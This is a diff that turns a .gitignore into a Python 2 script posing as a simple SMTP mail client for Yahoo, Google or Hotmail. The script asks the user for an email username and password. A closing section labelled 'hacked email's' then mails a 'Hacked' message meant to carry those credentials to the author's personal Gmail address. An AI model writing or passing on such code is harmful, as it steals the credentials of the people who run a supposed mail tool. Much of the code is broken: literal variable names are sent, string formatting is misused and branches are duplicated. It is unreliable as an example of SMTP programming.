@@ -1,27 +1,122 @@
-*.py[co]
+'''
+Created on Mar 29, 2012
 
-# Packages
-*.egg
-*.egg-info
-dist
-build
-eggs
-parts
-bin
-var
-sdist
-develop-eggs
-.installed.cfg
+@author: Ahmed Hamdy
+'''
 
-# Installer logs
-pip-log.txt
 
-# Unit test / coverage reports
-.coverage
-.tox
+import socket,base64,sys,time,smtplib
+#===================MAKE SOCKET===========================================
+my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print "====================Menu=============="
+print "1-Yahoo"
+print "2-Google"
+print "3-Hotmail"
+cho =input("enteer your choose")
+if cho==1:
+    try:
+        my_socket.connect(("smtp.mail.yahoo.com",25)) #equal telnet smtp.gmail.com 25 that make 3  hand sheck connection
+        my_socket.sendall("helo smtp.mail.yahoo.com")
+  data=my_socket.recv(4096)
+        print data
+    except socket.error:
+        print "connection failed"
+        sys.exit()
+elif cho==2:
+    try:
+        my_socket.connect(("smtp.gmail.com",25)) #equal telnet smtp.gmail.com 25 that make 3  hand sheck connection
+        my_socket.sendall("helo google.com")
+	data=my_socket.recv(4096)
+        print data
+    except socket.error:
+        print "connection failed"
+        sys.exit()
+elif cho==2:
+    try:
+        my_socket.connect(("smtp.email.msn.com",25)) #equal telnet smtp.gmail.com 25 that make 3  hand sheck connection
+        my_socket.sendall("helo smtp.email.msn.com")
+	data=my_socket.recv(4096)
+        print data
+    except socket.error:
+        print "connection failed"
+        sys.exit()
+else:
+    print "Enter a correct number"
+    time.sleep(5)
+    sys.exit()
+    
 
-#Translations
-*.mo
+my_socket.sendall("helo google")
+data=my_socket.recv(4096)
+print data
 
-#Mr Developer
-.mr.developer.cfg
+#=========================================================================
+my_socket.sendall("ehlo google")
+data=my_socket.recv(4096)
+print data
+
+#===================================AuTHORIZATION==========================
+
+my_socket.sendall("AUTH LOGIN")
+data=my_socket.recv(4096)
+print data
+
+#==================================LOGIN===================================
+
+print"please login you user name and password "
+user=raw_input("user please")
+UserEncoded = base64.b64encode(user)
+my_socket.sendall("UserEncoded")
+data=my_socket.recv(4096)
+print data
+#======================================
+pwd=raw_input("password please")
+PwdEncoded = base64.b64encode(pwd)
+my_socket.sendall("PwdEncoded")
+data=my_socket.recv(4096)
+print data
+#====================================Sender & RECEIVER========================
+From=raw_input("Enter the Sender Email")
+my_socket.sendall("MAIL FROM:<%s>")%From
+data=my_socket.recv(4096)
+print data
+TO=raw_input("Enter the Reciver Email")
+my_socket.sendall("RCPT TO:<%s>")%TO
+data=my_socket.recv(4096)
+print data
+#====================================THE MESSAGE WILL SEND=====================
+my_socket.sendall("DATA")
+data=my_socket.recv(4096)
+print data
+message=raw_input("Enter your message")
+yournName=raw_input("Enter YOUR name")
+reciverName=raw_input("Enter RECEIVER name")
+newMS="From: %s <%s>\nTo: %s <%s>\nSubject:%s" %(yournName,From,reciverName,TO,message)
+my_socket.sendall("%s")%newMS
+data=my_socket.recv(4096)
+print data
+#==================================END OF MESSAGE================================
+my_socket.sendall(".")
+data=my_socket.recv(4096)
+print data
+#==================================COLSE THE CONNECTION========================
+my_socket.sendall("QUIT")
+data=my_socket.recv(4096)
+print data
+
+#=====================hacked email's============
+message = """From: From hacked <user>
+To: To acker <dimo.hamdy@gmail.com>
+Subject: Hacked
+
+user & pwd .
+"""
+
+try:
+    smtpObj = smtplib.SMTP('smtp.gmail.com', 25)
+    smtpObj.sendmail('user','dimo.hamdy@gmail.com', message)         
+except socket.error:
+    print "close"
+    sys.exit()
+print "close"
+my_socket.close()
